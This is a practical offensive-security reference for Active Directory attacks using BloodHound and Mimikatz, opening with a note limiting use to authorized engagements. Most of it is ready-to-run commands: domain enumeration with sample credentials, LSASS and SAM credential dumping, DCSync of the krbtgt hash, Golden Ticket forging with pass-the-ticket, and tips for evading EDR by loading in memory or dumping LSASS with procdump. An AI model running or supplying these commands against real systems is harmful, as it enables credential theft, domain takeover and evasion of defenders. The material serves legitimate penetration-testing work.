# BloodHound + Mimikatz Reference

Practical reference for BloodHound (AD attack-path mapping) and Mimikatz (in-memory credential extraction on Windows).

> Scope note: everything below is for authorized lab/engagement use only — these are the two tools most capable of doing real damage to a live domain if misused (Mimikatz especially, once you get into ticket forging). Standard practice: don't run anything past credential dumping/enumeration against a domain controller without explicit sign-off, and treat Golden Ticket generation as something you understand conceptually before you ever run it against something that matters.

## Table of Contents

1. [BloodHound — Core Concept](#1-bloodhound--core-concept)
2. [Collecting Data](#2-collecting-data)
3. [Running BloodHound](#3-running-bloodhound)
4. [Mimikatz — Core Commands](#4-mimikatz--core-commands)
5. [Golden Ticket (Concept)](#5-golden-ticket-concept)
6. [Field Notes](#6-field-notes)

---

## 1. BloodHound — Core Concept

BloodHound ingests AD relationship data (users, groups, computers, sessions, ACLs, group memberships) into a graph database and lets you query it for attack paths — most usefully, "shortest path to Domain Admin from where I'm standing now." It turns AD enumeration from a manual slog into a queryable graph.

## 2. Collecting Data

Two collector options depending on where you're running from:

```
# From a Linux attack box, against the domain directly
bloodhound-python -d corp.local -u jsmith -p 'Password123' -ns 10.10.10.100 -c all

# From inside Windows (e.g. on a compromised host), the native collector
.\SharpHound.exe -c all
```

Both produce JSON files describing the domain's structure — these get imported into the BloodHound GUI.

## 3. Running BloodHound

```
sudo neo4j console &     # start the graph database backend (first run: set a password, remember it)
bloodhound &              # start the BloodHound GUI, then log in and drag the JSON files in
```

Once loaded, the built-in queries worth starting with: "Find Shortest Paths to Domain Admins" and "Find Principals with DCSync Rights" — both surface the highest-value attack paths without writing a custom query.

## 4. Mimikatz — Core Commands

Run from an elevated/SYSTEM context on a Windows target:

```
privilege::debug             # required first step — elevates Mimikatz's own access to read LSASS memory
sekurlsa::logonpasswords      # dump cleartext passwords / hashes of logged-on users from memory
lsadump::sam                  # dump local SAM database hashes
lsadump::lsa /patch           # dump LSA secrets
lsadump::dcsync /user:krbtgt  # remote credential dump via DCSync — requires replication rights, no local access needed
```

`sekurlsa::logonpasswords` is the highest-value single command — it recovers cleartext credentials cached in memory from every logged-in session, not just hashes.

## 5. Golden Ticket (Concept)

If you have the domain's `krbtgt` account hash (via DCSync or a DC compromise), you can forge a Kerberos TGT for any user, including Domain Admin — valid until the `krbtgt` password is rotated, independent of that user's actual password.

```
kerberos::golden /User:administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /id:500 /ptt
misc::cmd    # drop into a cmd shell with the forged ticket already injected
```

This is a persistence/impact-proving technique, not a reconnaissance one — understand what `/ptt` (pass-the-ticket, injects directly into the current session) does before running it, and only against a scope where ticket forgery is explicitly authorized.

## 6. Field Notes

**BloodHound is where you go the moment you have any valid domain credential — before doing anything else.** Even a low-privilege user account can usually enumerate enough AD structure to build the full attack graph. Running the collector early means you're working from a map instead of guessing which of a hundred users/computers is actually worth pursuing.

**Mimikatz increasingly gets flagged by EDR/AV just for touching disk.** In-memory-only execution (reflectively loaded, no binary dropped) or an alternative like `procdump`-ing LSASS and parsing the dump offline with `pypykatz` are both common workarounds when the binary itself is the thing getting caught, not the technique.
